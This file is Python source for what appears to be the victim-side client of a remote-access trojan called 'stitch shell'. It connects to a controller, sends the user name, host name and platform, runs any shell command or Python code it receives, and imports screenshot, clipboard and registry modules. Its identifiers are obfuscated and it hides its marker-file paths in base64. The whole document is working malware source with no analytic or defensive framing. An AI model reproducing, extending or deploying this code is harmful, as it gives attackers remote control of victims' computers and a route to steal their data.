
import os
import re
import sys
import math
import socket
import base64
import shutil
import zipfile
import datetime
import requests
import platform
import threading
import subprocess
from io import StringIO
from st_protocol import *
from st_encryption import *
from mss.exception import ScreenShotError
from time import strftime, sleep
from contextlib import contextmanager

import winreg
import pythoncom
from ctypes import *
import win32clipboard
from mss.windows import MSS
from PIL import Image, ImageFile


sp = subprocess
N = True
T = False
WMTKJ = send
OAKQ = sys.platform

def run_command(ZP):
    subp = sp.Popen(ZP,shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
    T, EXUBN = subp.communicate()
    if not EXUBN:
        if T == '':
            return "[+] Command successfully executed.\n"
        else:
            return T
    return "[!] {}".format(EXUBN)

def start_command(command):
    try:
        subp = sp.Popen(command, shell=True,
             stdin=None, stdout=None, stderr=None, close_fds=True)
        return '[+] Command successfully started.\n'
    except Exception as e:
        return '[!] {}\n'.format(str(e))

def no_error(WUM):
    if WUM.startswith("ERROR:") or WUM.startswith("[!]") :
        return T
    else:
        return N

def win_client(system = OAKQ):
    if system.startswith('win'):
        return N
    else:
        return T

def osx_client(system = OAKQ):
    if system.startswith('darwin'):
        return N
    else:
        return T

def lnx_client(system = OAKQ):
    if system.startswith('linux'):
        return N
    else:
        return T

def pyexec(MJYJ,client_socket,pylib=False):
    pyerror = None
    response = ''
    if pylib:
        try:
            exec(MJYJ)
        except Exception as e:
            EXUBN = f"[!] PYEXEC(): {e}"
            WMTKJ(client_socket,EXUBN)
    else:
        with stdoutIO() as s:
            try:
                exec(MJYJ)
            except Exception as e:
                EXUBN = f"[!] PYEXEC(): {e}"
                WMTKJ(client_socket,EXUBN)
        r = s.getvalue()
        WMTKJ(client_socket,r)

def determine_cmd(ZP,P):
    if ZP.strip()[:6] == "pyexec":
        pyexec(ZP.strip()[6:],P)
    elif ZP.strip()[:5] == "pylib":
        pyexec(ZP.strip()[5:],P,pylib=True)
    else:
        output=run_command(ZP)
        WMTKJ(P,output)

def get_user():
    if win_client():
        user = os.getenv('username')
    else:
        user = run_command('whoami')
    return user.strip()

def get_path():
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    path_name = "[{}@{}] {}>".format(user,hostname,current_dir)
    return path_name

def get_temp():
    if win_client():
        temp = "C:\\Windows\\Temp\\"
    else:
        temp = "/tmp/"
    return temp

def get_desktop():
    user = get_user()
    if win_client():
        SYKFS = os.path.join(os.getenv('userprofile'),'Desktop')
    elif osx_client():
        SYKFS = '/Users/{}/Desktop'.format(user)
        if not os.path.exists(SYKFS):
            logname = run_command('logname')
            SYKFS = '/Users/{}/Desktop'.format(logname.strip())
    else:
        SYKFS = '/home/{}'.format(user)
    return SYKFS

def stitch_running():
    HRPZ = os.getpid()
    SYKFS = os.path.abspath(sys.argv[0])
    if SYKFS.endswith('.py') or SYKFS.endswith('.pyc'):
        SYKFS = 'python.exe'
    if win_client():
        MJYJ = base64.b64decode('QzpcVXNlcnNcZ3VhaWRcc3RJbnN0YWxsLmxvZw==').decode()
    else:
        MJYJ = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=').decode()
    if os.path.exists(MJYJ):
        with open(MJYJ,'r') as st:
            data = st.readlines()
            data[0] = str(data[0]).strip()
        if data[0] == HRPZ:
            if data[1] == SYKFS:
                return True
        if win_client():
            exists_cmd = 'wmic process where "ProcessID={}" get ExecutablePath'.format(data[0])
        else:
            exists_cmd = 'ps -p {} -o comm='.format(data[0])
        running = run_command(exists_cmd)
        if running:
            if data[1] in running.strip() or running.strip() in data[1]:
                return True
    with open(MJYJ,'w') as st:
        st.write('{}\n{}'.format(HRPZ,SYKFS))
    return False

def zipdir(path, zipn):
    for root, dirs, files in os.walk(path):
        for file in files:
            zipn.write(os.path.join(root, file))

@contextmanager
def stdoutIO(stdout=None):
    prev = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = prev

def client_handler(P):
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    HRPZ = get_desktop()
    if os.path.exists(HRPZ):
        os.chdir(HRPZ)

    WMTKJ(P,'c3RpdGNoX3NoZWxs',encryption=False)
    WMTKJ(P,abbrev, encryption=False)
    WMTKJ(P,OAKQ)
    WMTKJ(P,user)
    WMTKJ(P,hostname)
    WMTKJ(P,platform.platform())
    cmd_buffer=""

    while N:
        try:
            cmd_buffer = receive(P)
            if not cmd_buffer: break
            if cmd_buffer == "end_connection": break
            determine_cmd(cmd_buffer.decode(),P)
        except socket.timeout as e:
            print(e)
        except Exception as e:
            if dbg:
                print(e)
            P.close()
            break

dbg = False
script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))


def reg_exists(path):
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
        return True
    except:
        return False


